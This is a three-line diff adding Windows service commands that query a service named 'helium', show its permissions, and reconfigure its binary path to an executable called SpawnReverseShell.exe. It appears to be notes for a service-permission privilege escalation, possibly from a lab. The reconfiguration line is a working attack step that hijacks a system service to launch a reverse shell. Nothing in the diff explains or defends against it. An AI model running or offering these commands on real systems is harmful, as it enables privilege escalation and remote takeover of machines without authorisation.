@@ -1,0 +1,3 @@
+sc query helium
+sc sdshow helium
+sc config helium binPath=C:\Users\user\Desktop\SpawnReverseShell.exe
